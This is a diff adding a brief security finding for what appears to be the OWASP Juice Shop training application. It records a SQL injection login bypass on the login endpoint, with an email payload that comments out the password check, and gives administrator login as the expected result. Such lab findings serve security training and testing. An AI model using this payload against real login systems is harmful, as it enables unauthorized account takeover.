@@ -1,0 +1,12 @@
+Finding: JUICE-001
+Vulnerability: SQL Injection - Login Bypass
+Endpoint: POST /rest/user/login
+
+Email Payload:
+admin@juice-sh.op'--
+
+Password:
+123456
+
+Expected Result:
+Login as administrator without knowing the correct password.
